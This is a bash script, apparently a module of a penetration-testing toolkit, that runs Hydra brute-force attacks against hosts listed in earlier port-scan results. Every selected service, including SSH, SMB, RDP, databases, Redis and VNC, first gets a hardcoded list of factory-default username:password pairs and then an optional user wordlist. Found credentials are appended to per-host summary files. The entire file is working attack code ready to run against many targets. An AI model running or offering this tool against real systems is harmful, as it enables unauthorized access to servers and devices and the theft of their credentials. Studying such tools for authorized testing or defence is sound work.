#!/usr/bin/env bash

# ------------------------------------------------------------
# brute.sh - Credential brute-force using port index files
# ------------------------------------------------------------
# Two-phase attack per service:
#   Phase 1 — hardcoded default credentials (fast, always runs)
#   Phase 2 — full user-supplied wordlist (thorough, optional)
#
# Uses Hydra -M for multi-target mode — one run per service.
# Requires: hydra
# ------------------------------------------------------------

BRUTE_TASKS="${BRUTE_TASKS:-4}"
BRUTE_TIMEOUT="${BRUTE_TIMEOUT:-30}"
BRUTE_EXIT_FOUND="${BRUTE_EXIT_FOUND:-true}"

declare -A PORT_SERVICE_MAP=(
  [21]="ftp"        [22]="ssh"        [23]="telnet"
  [25]="smtp"       [80]="http-get"   [110]="pop3"
  [139]="smb"       [143]="imap"      [443]="https-get"
  [445]="smb"       [3306]="mysql"    [3389]="rdp"
  [5432]="postgres" [5900]="vnc"      [6379]="redis"
  [8080]="http-get" [8443]="https-get"
)

declare -A SERVICE_DEFAULT_PORT=(
  [ftp]="21"        [ssh]="22"        [telnet]="23"
  [smtp]="25"       [http-get]="80"   [pop3]="110"
  [smb]="445"       [imap]="143"      [https-get]="443"
  [mysql]="3306"    [rdp]="3389"      [postgres]="5432"
  [vnc]="5900"      [redis]="6379"
)

# ------------------------------------------------------------
# DEFAULT CREDENTIALS — hardcoded, format: username:password
# Sources: vendor docs, CVE disclosures, public default
# credential databases. Factory/reset defaults for common
# services and devices found in real environments.
# ------------------------------------------------------------
_default_creds_for_service() {
  local svc="$1"
  case "$svc" in
    ssh)
      printf '%s\n' \
        'root:root' 'root:toor' 'root:password' 'root:1234' \
        'root:12345' 'root:admin' 'root:alpine' 'root:' \
        'admin:admin' 'admin:password' 'admin:1234' 'admin:admin123' 'admin:' \
        'pi:raspberry' 'ubnt:ubnt' 'user:user' 'user:password' \
        'guest:guest' 'test:test' 'support:support'
      ;;
    ftp)
      printf '%s\n' \
        'anonymous:anonymous' 'anonymous:' 'ftp:ftp' 'ftp:' \
        'admin:admin' 'admin:password' 'admin:1234' \
        'root:root' 'root:password' \
        'user:user' 'user:password' 'guest:guest' 'guest:' 'test:test'
      ;;
    telnet)
      printf '%s\n' \
        'root:root' 'root:toor' 'root:password' 'root:1234' 'root:' \
        'admin:admin' 'admin:password' 'admin:' \
        'user:user' 'guest:guest' \
        'cisco:cisco' 'cisco:' 'enable:enable' \
        'operator:operator' 'support:support'
      ;;
    smb)
      printf '%s\n' \
        'administrator:' 'administrator:password' 'administrator:Password1' \
        'administrator:admin' 'administrator:1234' 'administrator:Welcome1' \
        'administrator:Administrator' \
        'admin:admin' 'admin:password' 'admin:' \
        'guest:' 'guest:guest' 'root:root' 'user:password'
      ;;
    rdp)
      printf '%s\n' \
        'administrator:' 'administrator:password' 'administrator:Password1' \
        'administrator:admin' 'administrator:Welcome1' 'administrator:1234' \
        'administrator:Administrator' \
        'admin:admin' 'admin:password' 'admin:' \
        'user:password' 'user:user' 'guest:'
      ;;
    http-get|https-get)
      printf '%s\n' \
        'admin:admin' 'admin:password' 'admin:1234' 'admin:admin123' 'admin:' \
        'root:root' 'root:password' \
        'user:user' 'user:password' \
        'guest:guest' \
        'administrator:administrator' 'administrator:password' \
        'test:test' 'manager:manager'
      ;;
    mysql)
      printf '%s\n' \
        'root:' 'root:root' 'root:password' 'root:mysql' \
        'root:1234' 'root:toor' \
        'admin:admin' 'admin:password' \
        'mysql:mysql' 'mysql:' 'debian-sys-maint:'
      ;;
    postgres)
      printf '%s\n' \
        'postgres:postgres' 'postgres:password' 'postgres:' \
        'postgres:1234' 'postgres:admin' \
        'admin:admin' 'admin:password' 'root:root'
      ;;
    redis)
      printf '%s\n' ':' ':redis' ':password' ':admin' ':1234' ':foobared'
      ;;
    vnc)
      printf '%s\n' \
        ':password' ':1234' ':admin' ':root' ':vnc' ':12345' ':0000' ':'
      ;;
    smtp)
      printf '%s\n' \
        'admin:admin' 'admin:password' 'root:root' 'root:password' \
        'mail:mail' 'postmaster:postmaster' 'user:password' 'test:test' 'smtp:smtp'
      ;;
    pop3|imap)
      printf '%s\n' \
        'admin:admin' 'admin:password' 'root:root' 'root:password' \
        'user:password' 'user:user' 'mail:mail' 'mail:password' \
        'test:test' 'guest:guest'
      ;;
    *)
      printf '%s\n' \
        'admin:admin' 'admin:password' 'admin:1234' \
        'root:root' 'root:password' \
        'user:user' 'guest:guest' 'test:test'
      ;;
  esac
}

# ------------------------------------------------------------
# _collect_targets_for_service MAIN_FOLDER SERVICE
# ------------------------------------------------------------
_collect_targets_for_service() {
  local main_folder="$1" service="$2"
  local tmp_file port svc port_file
  tmp_file="$(mktemp /tmp/brute_targets_XXXXXX)"
  for port in "${!PORT_SERVICE_MAP[@]}"; do
    svc="${PORT_SERVICE_MAP[$port]}"
    [[ "$svc" != "$service" ]] && continue
    port_file="${main_folder}/${port}-tcp.txt"
    [[ -s "$port_file" ]] && cat "$port_file" >> "$tmp_file"
  done
  if [[ -s "$tmp_file" ]]; then
    sort -u "$tmp_file" -o "$tmp_file"
    echo "$tmp_file"
  else
    rm -f "$tmp_file"
    echo ""
  fi
}

# ------------------------------------------------------------
# _run_hydra_defaults SERVICE PORT TARGET_FILE OUT_FILE
# Phase 1 — default credentials via Hydra -C
# Returns 0 if creds found, 1 if not.
# ------------------------------------------------------------
_run_hydra_defaults() {
  local service="$1" port="$2" target_file="$3" out_file="$4"
  local creds_file exit_flag=""
  creds_file="$(mktemp /tmp/brute_defaults_XXXXXX)"
  _default_creds_for_service "$service" > "$creds_file"

  local cred_count target_count
  cred_count="$(wc -l < "$creds_file" | tr -d ' ')"
  target_count="$(wc -l < "$target_file" | tr -d ' ')"
  [[ "$BRUTE_EXIT_FOUND" == "true" ]] && exit_flag="-f"

  ui_info "  Phase 1 — default credentials (${cred_count} pairs, ${target_count} host(s))"

  hydra \
    -C "$creds_file" \
    -M "$target_file" \
    -s "$port" \
    -t "$BRUTE_TASKS" \
    -w "$BRUTE_TIMEOUT" \
    -o "$out_file" \
    $exit_flag -q \
    "$service" </dev/null 2>&1 || true

  rm -f "$creds_file"

  if [[ -s "$out_file" ]]; then
    local found
    found="$(grep -cE '^\[' "$out_file" 2>/dev/null || echo 0)"
    ui_ok "  Phase 1 — FOUND ${found} credential(s) via defaults!"
    return 0
  else
    ui_info "  Phase 1 — no default credentials matched."
    return 1
  fi
}

# ------------------------------------------------------------
# _run_hydra_wordlist SERVICE PORT TARGET_FILE USER_LIST PASS_LIST OUT_FILE
# Phase 2 — full wordlist via Hydra -L -P
# ------------------------------------------------------------
_run_hydra_wordlist() {
  local service="$1" port="$2" target_file="$3"
  local user_list="$4" pass_list="$5" out_file="$6"
  local target_count exit_flag=""
  target_count="$(wc -l < "$target_file" | tr -d ' ')"
  [[ "$BRUTE_EXIT_FOUND" == "true" ]] && exit_flag="-f"

  ui_info "  Phase 2 — wordlist brute-force (${target_count} host(s))"

  hydra \
    -L "$user_list" -P "$pass_list" \
    -M "$target_file" \
    -s "$port" \
    -t "$BRUTE_TASKS" \
    -w "$BRUTE_TIMEOUT" \
    -o "$out_file" \
    $exit_flag -q \
    "$service" </dev/null 2>&1 || true

  if [[ -s "$out_file" ]]; then
    local found
    found="$(grep -cE '^\[' "$out_file" 2>/dev/null || echo 0)"
    ui_ok "  Phase 2 — FOUND ${found} credential(s) via wordlist!"
  else
    ui_info "  Phase 2 — no credentials found."
  fi
}

# ------------------------------------------------------------
# run_brute_scan MAIN_FOLDER BRUTE_DIR USER_LIST PASS_LIST SELECTED_SERVICES
# ------------------------------------------------------------
run_brute_scan() {
  local main_folder="$1" brute_dir="$2"
  local user_list="$3" pass_list="$4"
  local selected_services="${5:-}"

  mkdir -p "$brute_dir"

  local -A seen_services=()
  local -a service_order=()
  local port svc port_file

  for port in "${!PORT_SERVICE_MAP[@]}"; do
    svc="${PORT_SERVICE_MAP[$port]}"
    port_file="${main_folder}/${port}-tcp.txt"
    echo " ${selected_services} " | grep -qw "$svc" || continue
    if [[ -s "$port_file" && -z "${seen_services[$svc]:-}" ]]; then
      seen_services[$svc]=1
      service_order+=("$svc")
    fi
  done

  if [[ "${#service_order[@]}" -eq 0 ]]; then
    ui_warn "None of the selected services (${selected_services}) were found in the scan."
    ui_warn "Check the project folder or broaden the service selection."
    return 0
  fi

  local summary_file="${brute_dir}/brute_summary.txt"
  {
    echo "========================================"
    echo " Brute-Force Summary"
    echo " Generated : $(date -Is)"
    echo " Phase 1   : Default credentials (always runs)"
    echo " Phase 2   : Wordlist"
    echo "   Users   : ${user_list:-not provided}"
    echo "   Passwords: ${pass_list:-not provided}"
    echo " Services  : ${selected_services}"
    echo "========================================"
    echo
  } > "$summary_file"

  local total="${#service_order[@]}"
  local i=0 targets_file default_out wordlist_out default_port

  ui_ok "Services to attack: ${service_order[*]}"
  echo

  for svc in "${service_order[@]}"; do
    i=$(( i + 1 ))
    ui_phase "Service ${i}/${total}: ${svc}"

    targets_file="$(_collect_targets_for_service "$main_folder" "$svc")"
    if [[ -z "$targets_file" ]]; then
      ui_warn "No targets found for ${svc}, skipping."
      continue
    fi

    local target_count
    target_count="$(wc -l < "$targets_file" | tr -d ' ')"
    ui_info "Targets: ${target_count} IP(s)"

    default_port="${SERVICE_DEFAULT_PORT[$svc]:-0}"
    default_out="${brute_dir}/${svc}_defaults_found.txt"
    wordlist_out="${brute_dir}/${svc}_wordlist_found.txt"

    # Phase 1 — always runs
    _run_hydra_defaults "$svc" "$default_port" "$targets_file" "$default_out" || true

    # Phase 2 — only if wordlists were provided and exist
    if [[ -n "${user_list:-}" && -n "${pass_list:-}" && \
          -f "${user_list:-x}" && -f "${pass_list:-x}" ]]; then
      _run_hydra_wordlist "$svc" "$default_port" "$targets_file" \
        "$user_list" "$pass_list" "$wordlist_out"
    else
      ui_info "  Phase 2 — skipped (no wordlists provided)."
    fi

    # Append to master summary
    {
      echo "--- ${svc} (port ${default_port}) ---"
      echo "Targets : ${target_count}"
      echo
      echo "  [ Phase 1 — Default Credentials ]"
      if [[ -s "$default_out" ]]; then
        echo "  Status : FOUND"
        grep -E '^\[' "$default_out" 2>/dev/null \
          | grep -v '^\[DATA\]\|^\[WARNING\]\|^\[ERROR\]' \
          | sed 's/^/  /' || true
      else
        echo "  Status : Nothing found"
      fi
      echo
      echo "  [ Phase 2 — Wordlist ]"
      if [[ -n "${user_list:-}" && -f "${user_list:-x}" ]]; then
        if [[ -s "$wordlist_out" ]]; then
          echo "  Status : FOUND"
          grep -E '^\[' "$wordlist_out" 2>/dev/null \
            | grep -v '^\[DATA\]\|^\[WARNING\]\|^\[ERROR\]' \
            | sed 's/^/  /' || true
        else
          echo "  Status : Nothing found"
        fi
      else
        echo "  Status : Skipped — no wordlist provided"
      fi
      echo
    } >> "$summary_file"

    rm -f "$targets_file"
    echo
  done

  ui_ok "Brute-force complete."
  ui_ok "Summary : ${summary_file}"
  ui_ok "Per-service results in: ${brute_dir}/"

  append_brute_to_summaries "$main_folder" "$brute_dir"
}

# ------------------------------------------------------------
# append_brute_to_summaries MAIN_FOLDER BRUTE_DIR
# ------------------------------------------------------------
append_brute_to_summaries() {
  local main_folder="$1" brute_dir="$2"
  local found_file ip ip_summary cred_line

  local -a found_files=()
  while IFS= read -r -d '' found_file; do
    found_files+=("$found_file")
  done < <(find "$brute_dir" -maxdepth 1 -name "*_found.txt" -size +0c -print0 2>/dev/null)

  if [[ "${#found_files[@]}" -eq 0 ]]; then
    ui_info "No credentials found — host summaries unchanged."
    return 0
  fi

  ui_info "Updating host summaries with found credentials..."

  local tmp_dir
  tmp_dir="$(mktemp -d /tmp/brute_creds_XXXXXX)"

  for found_file in "${found_files[@]}"; do
    while IFS= read -r cred_line; do
      [[ "$cred_line" =~ ^\[ ]]             || continue
      [[ "$cred_line" =~ host:[[:space:]] ]] || continue
      [[ "$cred_line" =~ \[DATA\]|\[WARNING\]|\[ERROR\] ]] && continue
      ip="$(echo "$cred_line" | grep -oP '(?<=host:\s)[\d.]+')" || continue
      [[ -z "$ip" ]] && continue
      echo "$cred_line" >> "${tmp_dir}/${ip}.txt"
    done < "$found_file"
  done

  local updated=0
  for cred_file in "${tmp_dir}"/*.txt; do
    [[ -f "$cred_file" ]] || continue
    ip="$(basename "$cred_file" .txt)"
    ip_summary="$(find "$main_folder" -path "*/hosts/${ip}/summary.txt" 2>/dev/null | head -n 1)"
    if [[ -z "$ip_summary" ]]; then
      ui_warn "Could not find summary.txt for ${ip} — skipping."
      continue
    fi
    {
      echo
      echo "=== Brute-Force Credentials Found ==="
      cat "$cred_file"
    } >> "$ip_summary"
    ui_ok "Credentials appended to: ${ip_summary}"
    updated=$(( updated + 1 ))
  done

  rm -rf "$tmp_dir"
  ui_ok "Updated ${updated} host summary file(s) with credentials."
}

export -f run_brute_scan
export -f append_brute_to_summaries
